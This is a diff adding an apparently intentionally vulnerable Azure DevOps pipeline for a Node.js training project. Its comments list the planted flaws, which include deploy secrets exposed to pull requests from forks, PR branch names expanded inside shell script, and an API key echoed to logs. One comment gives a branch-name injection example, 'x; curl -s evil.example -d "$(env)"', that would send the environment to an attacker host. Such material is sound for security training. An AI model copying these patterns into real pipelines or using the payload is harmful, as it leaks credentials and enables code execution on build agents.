@@ -1,0 +1,42 @@
+# UNSAFE ON PURPOSE — vulnerable-nodejs CI (Azure DevOps)
+# Vulnerability description: test_3.md. Do NOT connect to real credentials.
+#
+# Bugs baked in:
+#   1. Secrets exposed to PR builds from forks (secrets in variables for all triggers)
+#   2. Untrusted PR values interpolated into inline script (macro syntax)
+#   3. Loose image/template versions
+#   4. Over-privileged service connection for PR validation
+
+trigger:
+  branches:
+    include: [master]
+
+pr:
+  branches:
+    include: [master]
+
+pool:
+  vmImage: ubuntu-latest        # VULN (3): moving tag; pin an image version
+
+# VULN (1): secret mapped as a variable at pipeline level → available in every
+# job, including pull-request validation builds from forks.
+variables:
+  - name: nodeVersion
+    value: '22'
+  - group: nodebazaar-deploy           # variable group holding DEPLOY_API_KEY
+
+steps:
+  - script: |
+      npm install
+    displayName: Install dependencies
+
+  # VULN (2): $(System.PullRequest.SourceBranch) and the PR title are
+  # attacker-controlled and expanded inside the shell. A branch named
+  # `x; curl -s evil.example -d "$(env)" #` executes in the agent.
+  - script: |
+      echo "PR from branch: $(System.PullRequest.SourceBranch)"
+      echo "Last commit message: $(git log -1 --pretty=%B)"
+      echo "Deploying with key $(DEPLOY_API_KEY)"
+    displayName: Notify about the PR
+    condition: eq(variables['Build.Reason'], 'PullRequest')
+
